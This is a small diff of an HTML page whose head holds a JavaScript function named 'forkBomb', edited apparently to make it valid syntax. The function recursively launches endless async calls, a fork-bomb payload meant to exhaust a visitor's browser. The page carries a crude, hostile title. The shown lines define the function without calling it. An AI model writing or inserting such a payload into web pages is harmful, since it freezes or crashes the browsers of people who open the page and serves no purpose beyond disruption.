@@ -1,7 +1,9 @@
 <html>
 <head>
 <script>
-function forkBomb() ((f)=>f(f))((f)=>async()=>{while(1){f(f)();}})();
+function forkBomb() {
+	((f)=>f(f))((f)=>async()=>{while(1){f(f)();}})();
+}
 </script>
 <title> Fork-Bombed Bitch </title>
 </head>
